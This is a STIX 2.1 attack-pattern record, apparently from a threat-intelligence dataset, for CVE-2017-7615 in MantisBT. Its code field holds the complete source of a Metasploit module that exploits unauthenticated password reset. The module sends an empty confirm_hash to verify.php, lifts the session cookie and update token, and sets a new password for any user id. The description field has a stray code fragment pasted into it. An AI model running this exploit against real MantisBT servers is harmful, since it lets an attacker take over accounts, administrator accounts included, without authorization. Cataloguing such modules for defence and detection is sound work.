{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a32668b3-efb0-4e29-ac5b-1199e88a62a5",
    "created": "2024-08-14T16:23:13.3079Z",
    "modified": "2024-08-14T16:23:13.307904Z",
    "name": "MantisBT password reset",
    "description": " MantisBT before 1.3.10, 2.2.4, and 2.3.1 are vulnerable to unauthenticated password reset.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/mantisbt_password_reset.rb",
            "external_id": "mantisbt_password_reset.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-7615"
        },
        {
            "source_name": "reference",
            "url": "https://mantisbt.org/bugs/view.php?id=22690"
        },
        {
            "source_name": "reference",
            "url": "http://hyp3rlinx.altervista.org/advisories/MANTIS-BUG-TRACKER-PRE-AUTH-REMOTE-PASSWORD-RESET.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'MantisBT password reset',\n        'Description' => %q{\n          MantisBT before 1.3.10, 2.2.4, and 2.3.1 are vulnerable to unauthenticated password reset.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'John (hyp3rlinx) Page', # initial discovery\n          'Julien (jvoisin) Voisin' # metasploit module\n        ],\n        'References' => [\n          ['CVE', '2017-7615'],\n          ['EDB', '41890'],\n          ['URL', 'https://mantisbt.org/bugs/view.php?id=22690'],\n          ['URL', 'http://hyp3rlinx.altervista.org/advisories/MANTIS-BUG-TRACKER-PRE-AUTH-REMOTE-PASSWORD-RESET.txt']\n        ],\n        'Platform' => ['win', 'linux'],\n        'DisclosureDate' => '2017-04-16'\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('USERID', [ true, 'User id to reset', 1]),\n        OptString.new('PASSWORD', [ false, 'The new password to set (blank for random)', '']),\n        OptString.new('TARGETURI', [ true, 'Relative URI of MantisBT installation', '/'])\n      ]\n    )\n  end\n\n  def check\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, '/login_page.php'),\n      'method' => 'GET'\n    })\n\n    if res && res.body && res.body.include?('Powered by <a href=\"http://www.mantisbt.org\" title=\"bug tracking software\">MantisBT')\n      vprint_status('MantisBT detected')\n      return Exploit::CheckCode::Detected\n    else\n      vprint_status('Not a MantisBT Instance!')\n      return Exploit::CheckCode::Safe\n    end\n  rescue Rex::ConnectionRefused\n    print_error('Connection refused by server.')\n    return Exploit::CheckCode::Safe\n  end\n\n  def run\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, '/verify.php'),\n      'method' => 'GET',\n      'vars_get' => {\n        'id' => datastore['USERID'],\n        'confirm_hash' => ''\n      }\n    })\n\n    if !res || !res.body\n      fail_with(Failure::UnexpectedReply, 'Error in server response. Ensure the server IP is correct.')\n    end\n\n    cookie = res.get_cookies\n\n    if cookie == '' || !(res.body.include? 'Your account information has been verified.')\n      fail_with(Failure::NoAccess, 'Authentication failed')\n    end\n\n    if datastore['PASSWORD'].blank?\n      password = Rex::Text.rand_text_alpha(8)\n    else\n      password = datastore['PASSWORD']\n    end\n\n    if res.body =~ /<input type=\"hidden\" name=\"account_update_token\" value=\"([a-zA-Z0-9_-]+)\"/\n      token = ::Regexp.last_match(1)\n    else\n      fail_with(Failure::UnexpectedReply, 'Could not retrieve account_update_token')\n    end\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, '/account_update.php'),\n      'method' => 'POST',\n      'vars_post' => {\n        'verify_user_id' => datastore['USERID'],\n        'account_update_token' => ::Regexp.last_match(1),\n        'realname' => Rex::Text.rand_text_alpha(rand(8..12)),\n        'password' => password,\n        'password_confirm' => password\n      },\n      'cookie' => cookie\n    })\n\n    if res && res.body && res.body.include?('Password successfully updated')\n      print_good(\"Password successfully changed to '#{password}'.\")\n    else\n      fail_with(Failure::UnexpectedReply, 'Something went wrong, the password was not changed.')\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-04-16",
    "x_mitre_platforms": [
        "['win', 'linux']"
    ]
}